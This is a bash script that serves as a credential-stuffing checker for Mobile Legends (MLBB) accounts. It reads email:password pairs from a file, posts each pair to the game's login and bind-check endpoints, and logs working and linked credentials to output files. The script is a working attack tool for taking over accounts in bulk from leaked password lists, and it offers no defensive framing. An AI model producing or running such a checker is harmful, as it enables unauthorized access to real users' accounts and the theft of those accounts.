GREEN='\033[1;32m'
RED='\033[1;31m'
NC='\033[0m'

Account_Checker() {
    local email="$1"
    local password="$2"
    echo -e "${YELLOW}[MLBB] Checking: ${email}:${password}${NC}"

    response=$(curl -s -X POST "https://mlbb.garena.com/api/login" \
        -d "email=${email}" -d "password=${password}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -w "%{http_code}" -o /dev/null)

    if [[ "$response" == "200" ]]; then
        echo -e "${GREEN}[ACTIVE] MLBB Account: ${email}${NC}"
        echo "${email}:${password}" >> mlbb_active.txt
    else
        echo -e "${RED}[INACTIVE] MLBB Account: ${email}${NC}"
    fi
}

Bind_Checker() {
    local email="$1"
    local password="$2"
    echo -e "${YELLOW}[MLBB] Checking Bind: ${email}:${password}${NC}"

    response=$(curl -s -X POST "https://mlbb.garena.com/api/bind_check" \
        -d "email=${email}" -d "password=${password}" \
        -H "Content-Type: application/x-www-form-urlencoded")

    if echo "$response" | grep -q '"bound":true'; then
        echo -e "${GREEN}[BINDED] MLBB Account: ${email}${NC}"
        echo "${email}:${password}" >> mlbb_binded.txt
    else
        echo -e "${RED}[NOT BINDED] MLBB Account: ${email}${NC}"
    fi
}

while IFS=: read -r email password; do
    Bind_Checker "$email" "$password"
    Account_Checker "$email" "$password"
done < Test.txt